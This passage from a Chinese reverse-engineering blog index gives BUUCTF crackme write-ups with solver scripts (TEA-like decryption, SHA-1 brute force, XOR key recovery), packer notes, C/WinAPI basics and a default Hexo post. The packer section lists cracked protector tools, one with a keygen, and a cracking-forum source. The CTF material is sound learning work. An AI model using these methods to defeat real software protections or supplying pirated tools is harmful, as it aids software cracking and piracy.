2019]xxor(类似tea加密)</h3><ol><li>查看文件情况，无壳，64位，之后ida打开，发现main函数，在main函数位置进行反汇编<br><img src="/2021/120454815/32.png" alt=" ">  </li><li>1处：我们可以看出其实我们输入的应该是v6，最后进行求a2，我们猜想下a2可能是我们要的flag，但是下面第三部却对a2进行了赋值，这就导致猜错了，不过不慌，继续向下看<br>2处：进行循环 3次循环（关键点别忘了）<br>3处：对a2进行赋值，如下图<br><img src="/2021/120454815/33.png" alt=" "><br>4处：是对a1的6个数值进行的类似tea加密的操作，但不是严格tea加密形式，并且每次操作a1的两位数据<br><img src="/2021/120454815/34.png" alt=" "><br>5处：是对a1的6位数值的计算位置，在这个位置可以得出a1的6个值<br>6处：对于得到的16进制数值要转化为字符串(自己写的python代码没转化成，就去网上扣了一个c++的脚本)  </li><li>整体看完之后，我们可以直观的分析到我们其实要的就是最初的a1的那6个数值，所以在这里我们首先要求出a1的最终数值，之后从下到上反向的操作，求最初的数据<br>在5处，我们可以先求出a1的最终数据，因为这里只是简单的赋值，减法操作，其实我们可以很简单就写出来，就不附加上脚本了，之后我们在4处进行逆运算求最初的a1的6个数值即可  </li><li>脚本  </li></ol><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;#pragma warning(disable:4996)using namespace std;int main()&#123;    __int64 a[6] &#x3D; &#123; 3746099070, 550153460, 3774025685, 1548802262, 2652626477, 2230518816 &#125;;    unsigned int a2[4] &#x3D; &#123; 2,2,3,4 &#125;;    unsigned int v3, v4;    int v5;    for (int j &#x3D; 0; j &lt;&#x3D; 4; j +&#x3D; 2) &#123;        v3 &#x3D; a[j];        v4 &#x3D; a[j + 1];        v5 &#x3D; 1166789954*0x40;        for (int i &#x3D; 0; i &lt;&#x3D; 0x3F; ++i) &#123;            v4 -&#x3D; (v3 + v5 + 20) ^ ((v3 &lt;&lt; 6) + a2[2]) ^ ((v3 &gt;&gt; 9) + a2[3]) ^ 0x10;            v3 -&#x3D; (v4 + v5 + 11) ^ ((v4 &lt;&lt; 6) + *a2) ^ ((v4 &gt;&gt; 9) + a2[1]) ^ 0x20;            v5 -&#x3D; 1166789954;        &#125;        a[j] &#x3D; v3;        a[j + 1] &#x3D; v4;    &#125;    &#x2F;*将整型数组作为字符输出，注意计算机小端排序*&#x2F;    for (int i &#x3D; 0; i &lt; 6; ++i) &#123;        cout &lt;&lt; *((char*)&amp;a[i] + 2) &lt;&lt; *((char*)&amp;a[i] + 1) &lt;&lt;  * ((char*)&amp;a[i]);    &#125;    system(&quot;PAUSE&quot;);    return 0;&#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="BUUCTF-CrackRTF-拓宽思路"><a href="#BUUCTF-CrackRTF-拓宽思路" class="headerlink" title="BUUCTF CrackRTF(拓宽思路)"></a>BUUCTF CrackRTF(拓宽思路)</h3><ol><li>查看文件情况，无壳，32位，之后ida打开，发现main函数，在main函数位置进行反汇编<br><img src="/2021/120454815/36.png" alt=" "><br><img src="/2021/120454815/37.png" alt=" ">  </li><li>1处：先是对Destination、String1进行初始化，之后对Destination进行赋值，然后进行判断其长度是否等于6，等于6就符合要求<br>2处：显示将字符串Destination转换成（int）整形并赋值给v7，之后判断，如果v7&lt;100000，就不符合条件，所以我们知道v7&gt;100000<br>3处：将@DBApp子符串附加给Destination<br>4处：进行一个操作，具体情况如下图<br><img src="/2021/120454815/38.png" alt=" "><br>在这里我们可以看出该加密算法是哈希算法加密，并且由标识符0x8004u这里分析处使用的是SHA-1加密形式<br><a href="https://my.oschina.net/kivensoft/blog/549369">了解该形式加密解密算法请点击此处</a><br><a href="https://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id">标识符的官方文档请点击此处</a><br>5处：可以知道String1 == 6E32D0943418C2C33385BC35A1470250DD8923A9  </li><li>由五处我们就可以先接触flag的前六个字符串了  </li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">import hashlibstring&#x3D;&#39;@DBApp&#39;for i in range(100000,999999):    flag&#x3D;str(i)+string    x &#x3D; hashlib.sha1(flag.encode(&quot;utf8&quot;))    y &#x3D; x.hexdigest()    if &quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot; &#x3D;&#x3D; y:            print(flag)            break  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为长度有限直接暴力破解(看到别人的不会暴力破解，学习，学习)<br>04. 6处：我们同样要输入长度是6的串<br>7处：同样进行4处的操作<br>8处：可以知道这次String1 == 27019e688a4e62a649fd99cadaafdb4e<br>但是无法爆破了，不知到怎么办，不会，向下看<br>05. 9处也是一个函数，双击进去看看<br><img src="/2021/120454815/39.png" alt=" "><br>06. 对于上面这张图我们从上往下看<br>首先是一个FindResourceA()函数，这个我们查过之后可以知道是找句柄的，并且是从AAA资源中找句柄的<br>再者这个是如果知道到了所要的资源就将其大小(长度)记录下来<br>然后这个是如果知道到了所要的资源就将其值赋给lpBuffer<br>最后一个函数操作并生成一个.rtf文件，函数操作如下<br><img src="/2021/120454815/40.png" alt=" "><br>同时分析知在该函数中其实就是资源的每一位和密码的每一位循环异或<br>异或结束之后，生成一个rtf文件<br>同时知道<br>我们的密码一共是6+12=18位<br>我们现在想要的是前六位的密码，循环异或的话，那么也就是说，资源的前六位与密码的前六位异或的结果就是rtf文件的前六位<br>07. 我们找来一个rtf文件，看看它的标志位<br><img src="/2021/120454815/41.png" alt=" "><br>前六位是{\rtfl<br>08. AAA资源的前六位是<br><img src="/2021/120454815/42.png" alt=" "><br>09. 脚本  </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">rtf &#x3D; &#39;&#123;\\rtf1&#39; \\需要注意，\r需要转义，变成\\rA &#x3D; [0x05, 0x7D, 0x41, 0x15, 0x26, 0x01]password&#x3D;&#39;&#39;for i in range(len(rtf)):    x &#x3D; ord(rtf[i]) ^ A[i]    password+&#x3D;chr(x)print(password)  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后我们将程序运行将密码输入即可，两端密码输入完后，就会在程序所在文件夹中生成一个带有flag的rtf文件，打开就能得到flag  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>逆向常见壳</title>
      <link href="/2021/120329596.html"/>
      <url>/2021/120329596.html</url>
      
        <content type="html"><![CDATA[<p>#逆向常见壳  </p><ol><li>加壳目的  <ul><li>隐藏文件作者的个人信息或者相关不应该暴露的信息  </li><li>压缩文件，加壳之后文件的体积会变小  </li><li>有些黑客会使用壳来防止自己在文件中加入的病毒等东西被杀毒软件找到杀掉  </li></ul></li><li>常见壳的类型  <ul><li>压缩壳  </li><li>保护壳  </li><li>捆绑壳  </li></ul></li><li>压缩壳  <ul><li>upx加壳或脱壳  <ul><li>加壳原理: 首先将程序压缩。所谓的压缩包括两方面，一方面在程序的开头或者其他合适的地方 插入一段代码，另一方面是将程序的其他地方做压缩。压缩也可以叫做加密，因为压缩后的程序比较难看懂，主要是 和原来的代码有很大的不同。最大的表现也就是他的主要作用就是程序本身变小了。变小之后的程序在传输方面有很 大的优势。其次就是在程序执行时，实时的对程序解压缩  </li><li>加壳格式:<br>最初代码的形式就应该是:7==&gt;8==&gt;9==&gt;5==&gt;6<br>用upx压缩之后形式为：1==&gt;2==&gt;3==&gt;4==&gt;5==&gt;6<br>执行时的形式变为：1==&gt;7==&gt;8==&gt;9==&gt;5==&gt;6(其中1是upx插入的代码，2,3,4是文件代码,5,6随意)  </li><li>加壳解壳工具:<br>加壳：upx shell，也可以下载upx，在命令行中该目录下使用命令:upx 文件名 进行加壳操作<br>解壳：upx unpacker，也可以也可以下载upx，在命令行中该目录下使用命令:upx -d 文件名 进行解壳操作(我常用方式)，也可以进行手动解壳(太难，不建议使用，如果是大佬请忽略)  </li><li>示例：<br>upx加壳操作<br><img src="/2021/120329596/1.png"><br>upx解壳操作<br><img src="/2021/120329596/2.png"><br>手动解壳(待补充!!!)<br><a href="https://upx.github.io/">upx下载地址</a>  </li></ul></li><li>ASPack壳  <ul><li>ASPack壳也是压缩壳，加壳原理与upx相同  </li><li>加壳解壳工具:<br>加壳:ASPack<br>解壳:ASPack UnPacker  </li><li>示例:(未遇到，待补充)  </li></ul></li><li>PECompact壳  <ul><li>PECompact壳也是压缩壳，加壳原理与upx相同  </li><li>加壳解壳工具:<br>加壳:PECompact_v3.02.2_Final.7z<br>解壳:Unpacker_PECompact.7z  </li><li>示例:(未遇到，待补充)  </li></ul></li><li>RLPack壳  <ul><li>RLPack壳也是压缩壳，加壳原理与upx相同  </li><li>加壳解壳工具:<br>加壳:()<br>解壳:Rlpack 1.2x_Unpacker_V0.3_Final.rar  </li><li>示例:(未遇到，待补充)  </li></ul></li><li>NsPack壳  <ul><li>NsPack壳也是压缩壳，加壳原理与upx相同  </li><li>加壳解壳工具:<br>加壳:NsPack<br>解壳:NsPack strripter 3.x  </li><li>示例:(未遇到，待补充)  </li></ul></li></ul></li><li>保护壳  <ul><li>ASProtect壳    <ul><li>加壳解壳工具:<br>加壳:ASProtect.SKE.v2.51.build.09.22.beta-RES-incl-kg.7z<br>解壳:ASProtect Unpacker.rar  </li><li>示例:(未遇到，待补充)  </li></ul></li><li>Armadillo壳    <ul><li>加壳解壳工具:<br>加壳:<br>解壳:  </li><li>示例:(未遇到，待补充)  </li></ul></li><li>EXECryptor壳    <ul><li>加壳解壳工具:<br>加壳:()<br>解壳:Unpacker ExeCryptor 2.x.x v1.0 RC2.zip  </li><li>示例:(未遇到，待补充)  </li></ul></li><li>Themida壳    <ul><li>加壳解壳工具:<br>加壳:Themida_x32_x64_v3.0.4.0_Repacked.rar<br>解壳:Themida&amp;winlicense UnPacKer v2.0.rar  </li><li>示例:(未遇到，待补充)   </li></ul></li><li>VMProtect壳    <ul><li>加壳解壳工具:<br>VMProtect_Professional_v2.13.8.rar  </li><li>示例:(未遇到，待补充)   </li></ul></li></ul></li><li>捆绑壳  <ul><li>MoleBox壳  <ul><li>加壳解壳工具:<br>加壳:<br>解壳: Molebox_Virtualization_Studio_unpacker </li><li>示例:(未遇到，待补充)   </li></ul></li></ul></li><li>补充说明:<br> <a href="https://www.52pojie.cn/">以上部分加壳解壳工具下载地址</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>逆向中的一些基础</title>
      <link href="/2021/112836631.html"/>
      <url>/2021/112836631.html</url>
      
        <content type="html"><![CDATA[<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="strcmp-函数"><a href="#strcmp-函数" class="headerlink" title="strcmp()函数"></a>strcmp()函数</h3><ol><li>strcmp()函数采用两个char数组或字符串参数<br>格式：int strcmp (const char* str1, const char* str2)：第一个字符串或char数组，将与第二个字符串或char数组进行比较。 const主要用于防止更改给定的char数组指针。<br>返回值：str1&gt;str2–&gt;正整数;str1 &lt; str2 –&gt;负整数;str1 = str2 –&gt;0  </li><li>例如  </li><li>char str1[] = “abcd”, str2[] = “aBcd”：第一个字符串较大，并返回一个正整数，该整数是字符的值;第二个字符串较大，并返回一个负整数，该整数是字符的值；相同则会返回0。  </li><li>!strcmp(s, enflag)：比较s和enflag的字符串，相同就符合条件。（！后面跟着的数，不论正负，只要！过后就是0，而如果！后面的值是0的话，那么！0就是1了。）  </li></ol><h3 id="chr-函数"><a href="#chr-函数" class="headerlink" title="chr()函数"></a>chr()函数</h3><ol><li>chr()函数从指定ASCII码返回字符  </li><li>ASCII值可以为十进制值,八进制值(前置加0),十六进制值(前置加0x)。  </li></ol><h3 id="strlen函数"><a href="#strlen函数" class="headerlink" title="strlen函数"></a>strlen函数</h3><ol><li>格式：size_t strlen( const char *string )  </li><li>返回值是类型是size_t类型(长度)，strlen是不会计算\0的长度的，strlen函数遇到\0就会停止下来。  </li></ol><h3 id="isalpha-函数"><a href="#isalpha-函数" class="headerlink" title="isalpha()函数"></a>isalpha()函数</h3><ol><li>isalpha(ch):判断 字符ch是否为英文字母，当ch为英文字母a-z或A-Z时，在标准c中相当于使用“ isupper(ch)||islower(ch)”做测试，返回非零值(不一定是1)，否则返回零  </li><li>使用:chr(x).isalpha():python中用于判断  </li><li>islower（测试 字符是否为小写字母）  </li></ol><h3 id="strcat-函数"><a href="#strcat-函数" class="headerlink" title="strcat()函数"></a>strcat()函数</h3><p>strcat(a,”b”):将b处所代表的字符串附加到a里面  </p><h3 id="atoi-函数"><a href="#atoi-函数" class="headerlink" title="atoi()函数"></a>atoi()函数</h3><p>C 库函数 int atoi(const char *str) 把参数 str 所指向的字符串转换为一个整数（类型为 int 型）  </p><h3 id="FindResource-函数"><a href="#FindResource-函数" class="headerlink" title="FindResource()函数"></a>FindResource()函数</h3><ol><li>格式<br>HRSRC FindResource（HMODULE hModule，LPCTSTR lpName，LPCTSTR lpType）  </li><li>参数说明  </li></ol><ul><li>hModule：处理包含资源的可执行文件的模块。NULL值则指定模块句柄指向操作系统通常情况下创建最近过程的相关位图文件。  </li><li>lpName：指定资源名称。  </li><li>lpType：指定资源类型。作为标准资源类型。这个参数的含义同EnumResLangProclpType。  </li><li>返回值：如果函数运行成功，那么返回值为指向被指定资源信息块的句柄。为了获得这些资源，将这个句柄传递给LoadResource函数。如果函数运行失败，则返回值为NULL。若想获得更多错误信息，请调用GetLastError函数。  </li></ul><h2 id="IDA反汇编失败–call-analysis-failed"><a href="#IDA反汇编失败–call-analysis-failed" class="headerlink" title="IDA反汇编失败–call analysis failed"></a>IDA反汇编失败–call analysis failed</h2><h3 id="原因-可能是"><a href="#原因-可能是" class="headerlink" title="原因(可能是)"></a>原因(可能是)</h3><ul><li>IDA无法识别出正确的调用约定(calling convention)  </li><li>IDA无法识别出正确的参数个数  </li></ul><h3 id="IDA无法识别出正确的调用约定-calling-convention"><a href="#IDA无法识别出正确的调用约定-calling-convention" class="headerlink" title="IDA无法识别出正确的调用约定(calling convention)"></a>IDA无法识别出正确的调用约定(calling convention)</h3><p><img src="/2021/112836631/1.png" alt=" "><br>这个时候我们只要去出错位置分析就好了，看看是什么问题导致的<br><img src="/2021/112836631/2.png" alt=" "><br>在该位置可以判断参数参数正确，那就是ida无法识别正确的调用约定，这时候我们只要双击进入该函数，进行一下反汇编，之后在对main进行反汇编就可以了  </p><h3 id="IDA无法识别出正确的参数个数"><a href="#IDA无法识别出正确的参数个数" class="headerlink" title="IDA无法识别出正确的参数个数"></a>IDA无法识别出正确的参数个数</h3><p><img src="/2021/112836631/3.png" alt=" "><br>这个时候我们只要去出错位置分析就好了，看看是什么问题导致的<br><img src="/2021/112836631/4.png" alt=" "><br><img src="/2021/112836631/5.png" alt=" "><br>经分析可以知道该函数在该位置仅仅调用了两个函数，虽然0x50bf81这个地址ida反汇编中有9个，但是明显不符合要求<br><img src="/2021/112836631/6.png" alt=" "><br>这时候我们只要对该函数按’y’键，将其参数修改为两个，即可正常反编译  </p><h2 id="宏定义"><a href="#宏定义" class="headerlink" title="宏定义"></a>宏定义</h2><h3 id="LOWORD"><a href="#LOWORD" class="headerlink" title="LOWORD"></a>LOWORD</h3><ol><li>格式<br>#define LOWORD(l) ((WORD)((DWORD_PTR)(l) &amp; 0xffff))  </li><li>含义<br>取低16位的宏LOWORD使用按位与操作符与数字0xffff运算，而数字0xffff是一个低16位全为1的数字，那么对其位与操作可以得到参数的低16位  </li></ol><h3 id="HIWORD"><a href="#HIWORD" class="headerlink" title="HIWORD"></a>HIWORD</h3><ol><li>格式<br>#define HIWORD(l) ((WORD)((DWORD_PTR)(l) &gt;&gt; 16))  </li><li>含义<br>取高16位的宏HIWORD，只需将参数右移16位，剩下的就是原高16位的值  </li><li>总结<br>二者都是windef.h头文件中的定义</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/112316107.html"/>
      <url>/2021/112316107.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new &quot;My New Post&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
